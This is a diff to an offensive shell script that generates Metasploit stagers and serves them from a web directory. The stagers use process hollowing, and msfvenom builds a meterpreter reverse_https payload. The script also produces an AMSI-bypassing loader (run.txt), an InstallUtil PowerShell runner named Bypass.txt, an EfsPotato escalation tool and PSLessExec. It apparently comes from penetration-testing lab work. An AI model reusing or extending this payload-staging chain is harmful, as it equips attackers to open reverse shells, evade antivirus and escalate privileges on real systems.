@@ -4,6 +4,8 @@ WEBDIR=/var/www/html
 
 python3 generate_win_msf_stager.py --injection hollow --format exe
 python3 generate_win_msf_stager.py --injection hollow --format dll
+python3 generate_tool_loader.py --no-amsi metdll > run.txt
+python3 generate_tool_loader.py --no-amsi metexe >> run.txt
 python3 generate_win_installutil_ps_runner.py
 python3 generate_msf_linux_exe.py
 python3 generate_win_util_EfsPotato.py
@@ -15,6 +17,7 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw -o sc3
 
 sudo mv win_msf_stager.dll ${WEBDIR}/met.dll
 sudo mv win_msf_stager.exe ${WEBDIR}/met.exe
+sudo mv run.txt ${WEBDIR}/run.txt
 sudo mv win_installutil_ps_runner.txt ${WEBDIR}/Bypass.txt
 sudo mv msf-linux-x64 ${WEBDIR}/
 sudo mv win_pslessexec.exe ${WEBDIR}/tools/PSLessExec.exe
